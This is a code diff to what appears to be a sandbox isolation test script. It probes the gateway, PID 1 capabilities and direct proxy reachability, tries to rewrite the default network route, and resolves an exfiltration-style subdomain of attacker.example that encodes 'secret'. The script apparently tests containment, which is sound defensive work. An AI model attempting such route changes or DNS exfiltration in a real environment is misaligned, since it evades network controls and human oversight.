@@ -52,6 +52,28 @@ def udp(host, port):
         return repr(e)[:120]
 
 
+def default_gateway():
+    for line in open("/proc/net/route").read().splitlines()[1:]:
+        f = line.split()
+        if f[1] == "00000000":
+            return socket.inet_ntoa(bytes.fromhex(f[2])[::-1])
+    return None
+
+
+def pid1_status():
+    out = {}
+    for line in open("/proc/1/status"):
+        k, _, v = line.partition(":")
+        if k in ("Uid", "CapEff", "CapBnd", "CapPrm", "NoNewPrivs"):
+            out[k] = v.split()[0]
+    return out
+
+
+GW = default_gateway()
+R["default_gateway"] = GW
+R["pid1"] = pid1_status()
+# The proxy port must be unreachable except through the redirect.
+R["direct_proxy_port"] = {h: tcp(h, 8080) for h in ("127.0.0.1", GW) if h}
 AUTH = ["-H", f"Authorization: Bearer {FA}"]
 R["proxy_env"] = {k: v for k, v in os.environ.items() if "proxy" in k.lower()}
 R["placeholders"] = {k: os.environ.get(k) for k in ("FAKEAPI_TOKEN", "ENV_TOKEN", "CMD_TOKEN")}
@@ -79,5 +101,22 @@ R["mitm"] = tls_issuer("api.example.test")
 R["tcp_22"] = tcp("1.1.1.1", 22)
 R["tcp_fakeapi_8443"] = tcp("api.example.test", 8443)
 R["udp_443"] = udp("1.1.1.1", 443)
-R["whoami"] = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
+def resolves(name):
+    try:
+        return socket.gethostbyname(name)
+    except OSError as e:
+        return f"error: {e}"
+
+
+def try_route_change():
+    gw = (GW or "0.0.0.0").rsplit(".", 1)[0] + ".1"   # e.g. Docker's bridge gateway
+    p = subprocess.run(["ip", "route", "replace", "default", "via", gw],
+                       capture_output=True, text=True)
+    return {"rc": p.returncode, "err": p.stderr.strip()[:120]}
+
+
+R["route_change"] = try_route_change()
+R["dns_allowed"] = resolves("api.example.test")
+R["dns_unlisted"] = resolves("exfil-c2VjcmV0.attacker.example")
+R["whoami"] =subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
 print(json.dumps(R))
